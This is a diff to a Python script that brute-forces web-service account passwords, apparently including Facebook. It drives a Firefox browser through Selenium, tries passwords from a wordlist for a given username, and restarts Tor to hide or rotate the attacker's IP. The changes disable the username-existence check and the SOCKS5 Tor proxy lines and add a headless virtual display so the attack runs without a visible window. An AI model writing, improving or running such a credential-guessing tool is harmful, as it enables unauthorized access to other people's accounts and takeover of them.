@@ -51,11 +51,11 @@ def main():
 
     os.system("clear")
 
-    if service == "facebook":
+#    if service == "facebook":
 
-        fb_name = raw_input(O + "Please Enter The NAME Of The Facebook Account : " + W)
+#        fb_name = raw_input(O + "Please Enter The NAME Of The Facebook Account : " + W)
 
-        os.system("clear")
+#        os.system("clear")
 
  
     os.system("/etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") # restarting tor & removing geckodriver log
@@ -86,13 +86,13 @@ class Bruter(object):
 
     def execute(self):   # Connection Between def main() 
   
-        if self.usercheck(self.username, self.service) == 1:
+#        if self.usercheck(self.username, self.service) == 1:
 
-            print("[ " + R + "Error" + W + " ]" + " Username Does not Exist\n" + W)
+#            print("[ " + R + "Error" + W + " ]" + " Username Does not Exist\n" + W)
             
-            exit(1)
+#            exit(1)
 
-        print("[ " + G + "ok" + W + " ]" + " Checking Account Existence\n")
+#        print("[ " + G + "ok" + W + " ]" + " Checking Account Existence\n")
 
         self.webBruteforce(self.username, self.wordlist, self.service, self.delay)
 
@@ -141,7 +141,11 @@ class Bruter(object):
 
 
     def webBruteforce(self, username, wordlist, service, delay):
-
+        
+        display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
+        
+        display.start()
+        
         print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
 
         driver = webdriver.Firefox()
@@ -223,8 +227,8 @@ class Bruter(object):
 
                 my_ip = urlopen("http://ip.42.pl/raw").read()
 
-                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
-                socket.socket = socks.socksocket
+#                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
+#                socket.socket = socks.socksocket
 
                 print(O + ("  Password: {} \t| Failed \t| IP : {} \n ".format(password,my_ip)) + W)
 
@@ -260,4 +264,3 @@ if __name__ == '__main__':
         os.system("rm -rf tmp/ geckodriver.log && service tor stop")
 
         exit(1) 
-        python setup.py
